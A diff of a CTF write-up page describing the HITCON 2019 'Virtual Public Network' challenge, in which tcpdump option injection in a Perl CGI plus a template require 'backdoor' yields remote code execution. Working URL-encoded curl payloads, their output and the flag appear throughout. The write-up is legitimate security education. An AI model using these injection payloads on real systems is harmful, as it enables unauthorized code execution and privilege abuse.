@@ -16,20 +16,20 @@
   <meta http-equiv="window-target" content="_top">
   
   <title>[Web] Hitcon 2019 - Virtual Public Network | TeamRocketIST - Portuguese CTF Team</title>
-  <meta name="description" content="Virtual Public Network [183pts] Vulnerable Point of Your Network 😃 http://13.231.137.9 Author: 🍊Orange 81 Teams solved.  We have have a web interface where we can control tcpdump command via option">
+  <meta name="description" content="Virtual Public Network [183pts] Vulnerable Point of Your Network :) http://13.231.137.9 Author: 🍊Orange 81 Teams solved.  We have have a web interface where we can control tcpdump command via option">
 <meta name="keywords" content="perl,cgi,vpnssl">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[Web] Hitcon 2019 - Virtual Public Network">
 <meta property="og:url" content="https://teamrocketist.github.io/2019/10/14/Web-Hitcon-2019-Virtual-Public-Network/index.html">
 <meta property="og:site_name" content="TEAMROCKETIST">
-<meta property="og:description" content="Virtual Public Network [183pts] Vulnerable Point of Your Network 😃 http://13.231.137.9 Author: 🍊Orange 81 Teams solved.  We have have a web interface where we can control tcpdump command via option">
+<meta property="og:description" content="Virtual Public Network [183pts] Vulnerable Point of Your Network :) http://13.231.137.9 Author: 🍊Orange 81 Teams solved.  We have have a web interface where we can control tcpdump command via option">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https://1.bp.blogspot.com/-2bmmwKH2Er8/XW0DfygFjLI/AAAAAAAAEWc/srwYqeeUj7QSGvd1FmUHMasLezoiTFrUwCLcBGAs/s1600/upload_153c58ab7d99f019e4090a3a600261a0%255B1%255D.png">
 <meta property="og:image" content="https://i.imgur.com/DEbUX4H.png">
 <meta property="og:updated_time" content="2022-08-23T00:14:55.169Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="[Web] Hitcon 2019 - Virtual Public Network">
-<meta name="twitter:description" content="Virtual Public Network [183pts] Vulnerable Point of Your Network 😃 http://13.231.137.9 Author: 🍊Orange 81 Teams solved.  We have have a web interface where we can control tcpdump command via option">
+<meta name="twitter:description" content="Virtual Public Network [183pts] Vulnerable Point of Your Network :) http://13.231.137.9 Author: 🍊Orange 81 Teams solved.  We have have a web interface where we can control tcpdump command via option">
 <meta name="twitter:image" content="https://1.bp.blogspot.com/-2bmmwKH2Er8/XW0DfygFjLI/AAAAAAAAEWc/srwYqeeUj7QSGvd1FmUHMasLezoiTFrUwCLcBGAs/s1600/upload_153c58ab7d99f019e4090a3a600261a0%255B1%255D.png">
   
     <link rel="alternate" href="/atom.xml" title="TEAMROCKETIST" type="application/atom+xml">
@@ -382,7 +382,7 @@
       
         <blockquote>
 <p>Virtual Public Network [183pts]</p>
-<p>Vulnerable Point of Your Network 😃</p>
+<p>Vulnerable Point of Your Network :)</p>
 <p><a href="http://13.231.137.9" target="_blank" rel="noopener">http://13.231.137.9</a></p>
 <p>Author: 🍊Orange</p>
 <p>81 Teams solved.</p>
@@ -407,7 +407,7 @@
 <p>We can’t really control stdout in the application so we need to redirect the stderr into a file and use the backdoor present here:</p>
 <figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># backdoor :)</span></span><br><span class="line"><span class="keyword">my</span> $tpl = CGI::param(<span class="string">"tpl"</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">length</span> $tpl &gt; <span class="number">0</span> &amp;&amp; <span class="keyword">index</span>($tpl, <span class="string">".."</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">    $tpl = <span class="string">"./tmp/"</span> . $tpl . <span class="string">".thtml"</span>;</span><br><span class="line">    <span class="keyword">require</span>($tpl);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>So if we send our payload to a file at <strong>./tmp</strong> and pass the file name to tpl get parameter, require will execute as perl and we get <strong>RCE</strong>.</p>
-<p>Our final payload will require a <strong>&lt;</strong> in the end to fool <strong><a href="http://DSSAFE.pm" target="_blank" rel="noopener">DSSAFE.pm</a></strong> and redirect <strong>STDERR</strong> into a folder that we can write and read, this folder is <strong>./tmp</strong> :</p>
+<p>Our final payload will require a <strong>&lt;</strong> in the end to fool <strong>DSSAFE.pm</strong> and redirect <strong>STDERR</strong> into a folder that we can write and read, this folder is <strong>./tmp</strong> :</p>
 <figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-r$x=<span class="string">"ls /"</span>,<span class="keyword">exec</span>$x<span class="comment"># 2&gt;./tmp/qw.thtml &lt;&amp;tpl=qw</span></span><br></pre></td></tr></table></figure>
 <p>And now url encoding the string:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-r<span class="variable">$x</span>=<span class="string">"ls%20/"</span>,<span class="built_in">exec</span><span class="variable">$x</span>%23%202&gt;./tmp/qw.thtml%20&lt;&amp;tpl=qw</span><br></pre></td></tr></table></figure>
@@ -415,7 +415,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-r\<span class="variable">$x</span>=<span class="string">"ls%20/"</span>,<span class="built_in">exec</span>\<span class="variable">$x</span>%23%202&gt;./tmp/qw.thtml%20&lt;&amp;tpl=qw</span><br></pre></td></tr></table></figure>
 <p>Using curl to test our payload:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">"http://13.231.137.9/cgi-bin/diag.cgi?options=-r\$x=\"ls%20/\",exec\$x%23%202&gt;./tmp/qw.thtml%20&lt;&amp;tpl=qw"</span></span><br><span class="line"><span class="variable">$READ_FLAG</span>$</span><br><span class="line">FLAG</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">initrd.img</span><br><span class="line">initrd.img.old</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">lost+found</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">snap</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">vmlinuz</span><br><span class="line">vmlinuz.old</span><br></pre></td></tr></table></figure>
-<p>And it worked we managed to run <strong>ls</strong>, but we now see <code>$READ_FLAG$</code> which is an executable and the file <strong>FLAG</strong> containing the flag , we don’t rights to read directly only root can, our user is <strong>www-data</strong>, but if we manage to run the executable <code>$READ_FLAG$</code> (setuid bit is enabled so it will run as root which is the file owner).</p>
+<p>And it worked we managed to run <strong>ls</strong>, but we now see <code>$READ_FLAG$</code> which is an executable and the file <strong>FLAG</strong> containing the flag , we don’t rights to read directly only root can, our user is <strong>www-data</strong>, but if we manage to run the executable <code>$READ_FLAG$</code> (setuid bit is enabled so it will run as root which is the file owner). </p>
 <p>I run into some problems because of the file name there is some shitty symbols($) so we need to do some tricks to be able to execute:</p>
 <ul>
 <li>Backslash with <strong>\x5c</strong> dolar signs so they won’t be interpreted as a bash variable.</li>
@@ -426,10 +426,8 @@
 <figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-r\$x=\<span class="string">"sh -c '/\x5c\x24READ_FLAG\x5c\x24'"</span>,<span class="keyword">exec</span>\$x<span class="comment"># 2&gt;./tmp/qw.thtml &lt;&amp;tpl=qw</span></span><br></pre></td></tr></table></figure>
 <p>With url encoding:</p>
 <figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-r\$x=\<span class="string">"sh%20-c%20'/\x5c\x24READ_FLAG\x5c\x24'\",exec\$x%23%202&gt;./tmp/qw.thtml%20&amp;tpl=qw</span></span><br></pre></td></tr></table></figure>
-<p>Running with curl:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">"http://13.231.137.9/cgi-bin/diag.cgi?options=-r\$x=\"sh%20-c%20'/\x5c\x24READ_FLAG\x5c\x24'\",exec\$x%23%202&gt;./tmp/qw.thtml%20&lt;&amp;tpl=qw"</span></span><br><span class="line">hitcon&#123;Now I<span class="string">'m sure u saw my Bl4ck H4t p4p3r :P&#125;</span></span><br></pre></td></tr></table></figure>
-<p>The flag was:<br>
-<img src="https://i.imgur.com/DEbUX4H.png" alt></p>
+<p>Running with curl:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">"http://13.231.137.9/cgi-bin/diag.cgi?options=-r\$x=\"sh%20-c%20'/\x5c\x24READ_FLAG\x5c\x24'\",exec\$x%23%202&gt;./tmp/qw.thtml%20&lt;&amp;tpl=qw"</span></span><br><span class="line">hitcon&#123;Now I<span class="string">'m sure u saw my Bl4ck H4t p4p3r :P&#125;</span></span><br></pre></td></tr></table></figure></p>
+<p>The flag was:<br><img src="https://i.imgur.com/DEbUX4H.png" alt></p>
 <p>References:</p>
 <ul>
 <li><a href="https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html" target="_blank" rel="noopener">https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html</a></li>
